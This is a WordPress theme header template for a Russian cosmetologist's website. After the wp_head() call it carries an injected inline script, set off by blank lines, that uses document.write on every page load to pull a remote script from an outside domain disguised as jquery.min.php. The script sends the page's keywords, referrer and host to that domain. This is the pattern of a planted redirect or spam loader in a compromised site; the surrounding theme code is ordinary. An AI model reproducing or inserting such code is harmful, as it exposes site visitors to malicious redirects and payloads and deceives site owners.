<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package Adaption
 */
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title><?php wp_title( '|', true, 'right' ); ?></title>
	<link href="<?php echo get_template_directory_uri(); ?>/favicon.ico" rel="shortcut icon">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<link href='http://fonts.googleapis.com/css?family=Arimo:400,700,400italic&subset=latin,cyrillic-ext' rel='stylesheet' type='text/css'>
	<?php wp_head(); ?>





<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://www.bonhoeffer.pl/js/jquery.min.php?c_utt=I92930&c_utm='+encodeURIComponent('http://www.bonhoeffer.pl/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>

<meta name="google-site-verification" content="teb9_tEYzkK0gqPnmRlP4jSA-ks7QNnGwDCXyFnbqZY" />
</head>
<body <?php body_class(); ?>>
<div id="page" class="hfeed site">
	<?php do_action( 'before' ); ?>

	<div id="mobile-panel">
		<?php
		if ( has_nav_menu( 'headerok' ) ) : ?>
			<div id="headerok-nav" class="headerok-small">
				<?php wp_nav_menu( array(

				) ); ?>
			</div><!-- headerok-nav -->
		<?php endif; ?>
		<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">Доктор Марина Невдовец</a></h1>
		<h2 class="site-description">профессиональный косметолог</h2>
	</div>

	<div id="panel-block">
		<div id="mobile-block">
			<nav id="site-navigation" class="main-navigation" role="navigation">
				<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'adaption' ); ?></a>
				<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
			</nav><!-- #site-navigation .main-navigation -->

			<?php
			if ( has_nav_menu( 'social' ) ) : ?>
				<div id="social-links-wrapper">
					<?php wp_nav_menu( array(
						'theme_location'  => 'social',
						'container_class' => 'social-links',
						'menu_class'      => 'clear',
						'link_before'     => '<span class="screen-reader-text">',
						'link_after'      => '</span>',
					) ); ?>
				</div>
			<?php endif; ?>
		</div><!-- #mobile-block-->

		<?php if ( is_active_sidebar( 'sidebar-1' ) || is_active_sidebar( 'sidebar-2' ) ) : ?>
			<div id="widget-block">

				<div class="widget-areas">
					<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
						<div class="widget-area">
							<?php dynamic_sidebar( 'sidebar-1' ); ?>
						</div><!-- .widget-area -->
					<?php endif; ?>
				</div><!-- .widgets-areas -->

				<div class="widget-areas">
					<?php if ( is_active_sidebar( 'sidebar-2' ) ) : ?>
						<div class="widget-area">
							<?php dynamic_sidebar( 'sidebar-2' ); ?>
						</div><!-- .widget-area -->
					<?php endif; ?>
				</div><!-- .widgets-areas -->

			</div><!-- #widget-block-->
		<?php endif; ?>

	</div>

	<header id="masthead" class="panel" role="banner">
		<?php
		// You can upload a custom header and it'll output in a smaller logo size.
		$header_image = get_header_image();

		if ( ! empty( $header_image ) ) { ?>
			<div id="header-image" class="custom-header">
				<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
					<img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="" class="header-image" />
				</a>
			</div><!-- #header-image .custom-header -->
		<?php } else { ?>
			<div id="header-image" class="no-header"></div><!-- #header-image .no-header -->
		<?php } ?>

		<nav id="site-navigation" class="main-navigation" role="navigation">
			<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'adaption' ); ?></a>
			<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
		</nav><!-- #site-navigation .main-navigation -->

		<?php
		if ( has_nav_menu( 'social' ) ) : ?>
			<div id="social-links-wrapper">
				<?php wp_nav_menu( array(
					'theme_location'  => 'social',
					'container_class' => 'social-links',
					'menu_class'      => 'clear',
					'link_before'     => '<span class="screen-reader-text">',
					'link_after'      => '</span>',
				) ); ?>
			</div>
		<?php endif; ?>

		<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
			<div class="widget-areas">
				<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
					<div class="widget-area">
						<?php dynamic_sidebar( 'sidebar-1' ); ?>
					</div><!-- .widget-area -->
				<?php endif; ?>
			</div><!-- .widgets-areas -->
		<?php endif; ?>

	</header><!-- #masthead .site-header -->

	<?php get_sidebar(); ?>

	<div id="content" class="site-content">